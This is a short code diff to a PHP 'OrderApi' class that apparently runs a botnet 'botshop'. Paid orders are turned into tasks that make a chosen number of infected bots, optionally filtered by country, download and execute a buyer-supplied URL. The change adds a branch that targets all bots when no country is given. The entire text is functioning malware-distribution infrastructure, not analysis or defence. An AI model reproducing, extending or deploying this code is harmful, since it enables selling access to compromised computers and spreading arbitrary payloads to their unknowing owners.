@@ -229,7 +229,12 @@ class OrderApi
             //Update order and insert Task
             if($order["taskid"] == "none"){
                 $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, task, command, execution_limit) VALUES (?, ?, ?, ?, ?)");
-                $statement->execute(array('{"country":"'.$order["word_mix"].'"}', 0, 'dande', $order["loadurl"], $order["botamount"]));
+                if($order["word_mix"] != "none"){
+                    $statement->execute(array('{"country":"'.$order["word_mix"].'"}', 0, 'dande', $order["loadurl"], $order["botamount"]));
+                }else{
+                    $statement->execute(array('{"onlybot":""}', 0, 'dande', $order["loadurl"], $order["botamount"]));
+                }
+
                 $taskid = $GLOBALS["pdo"]->lastInsertId();
 
                 $statement = $GLOBALS["pdo"]->prepare("UPDATE botshop_orders SET payed = ?, taskid = ? WHERE address = ?");
